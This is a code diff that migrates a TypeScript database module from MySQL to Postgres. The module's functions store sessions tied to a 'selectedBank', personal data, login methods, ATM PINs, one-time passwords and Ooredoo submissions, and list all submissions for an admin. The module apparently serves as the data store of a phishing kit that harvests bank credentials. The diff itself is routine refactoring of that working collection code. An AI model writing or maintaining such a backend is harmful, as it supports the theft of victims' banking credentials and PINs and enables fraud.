@@ -1,5 +1,6 @@
 import { eq } from "drizzle-orm";
-import { drizzle } from "drizzle-orm/mysql2";
+import { drizzle } from "drizzle-orm/postgres-js";
+import postgres from "postgres";
 import { InsertUser, users } from "../drizzle/schema";
 import { ENV } from './_core/env';
 import {
@@ -16,13 +17,13 @@ import {
   type InsertOoredooSubmission,
 } from "../drizzle/schema";
 
-let _db: ReturnType<typeof drizzle> | null = null;
+let _db: any = null;
 
-// Lazily create the drizzle instance so local tooling can run without a DB.
 export async function getDb() {
   if (!_db && process.env.DATABASE_URL) {
     try {
-      _db = drizzle(process.env.DATABASE_URL);
+      const client = postgres(process.env.DATABASE_URL);
+      _db = drizzle(client);
     } catch (error) {
       console.warn("[Database] Failed to connect:", error);
       _db = null;
@@ -81,7 +82,8 @@ export async function upsertUser(user: InsertUser): Promise<void> {
       updateSet.lastSignedIn = new Date();
     }
 
-    await db.insert(users).values(values).onDuplicateKeyUpdate({
+    await db.insert(users).values(values).onConflictDoUpdate({
+      target: users.openId,
       set: updateSet,
     });
   } catch (error) {
@@ -102,7 +104,6 @@ export async function getUserByOpenId(openId: string) {
   return result.length > 0 ? result[0] : undefined;
 }
 
-// Session management
 export async function createSession(sessionId: string, selectedBank: string) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -132,7 +133,6 @@ export async function getSessionByIdWithAllData(sessionId: string) {
   };
 }
 
-// Personal data submission
 export async function submitPersonalData(data: InsertPersonalDataSubmission) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -140,7 +140,6 @@ export async function submitPersonalData(data: InsertPersonalDataSubmission) {
   return result;
 }
 
-// Login method submission
 export async function submitLoginMethod(data: InsertLoginMethodSubmission) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -148,7 +147,6 @@ export async function submitLoginMethod(data: InsertLoginMethodSubmission) {
   return result;
 }
 
-// ATM PIN submission
 export async function submitAtmPin(data: InsertAtmPinSubmission) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -156,7 +154,6 @@ export async function submitAtmPin(data: InsertAtmPinSubmission) {
   return result;
 }
 
-// OTP submission
 export async function submitOtp(data: InsertOtpSubmission) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -164,7 +161,6 @@ export async function submitOtp(data: InsertOtpSubmission) {
   return result;
 }
 
-// Ooredoo submission
 export async function submitOoredoo(data: InsertOoredooSubmission) {
   const db = await getDb();
   if (!db) throw new Error("Database not available");
@@ -172,7 +168,6 @@ export async function submitOoredoo(data: InsertOoredooSubmission) {
   return result;
 }
 
-// Get all submissions for admin
 export async function getAllSubmissions() {
   const db = await getDb();
   if (!db) return [];
@@ -180,7 +175,6 @@ export async function getAllSubmissions() {
   return result;
 }
 
-// Get submission details with all related data
 export async function getSubmissionDetails(sessionId: string) {
   return getSessionByIdWithAllData(sessionId);
 }
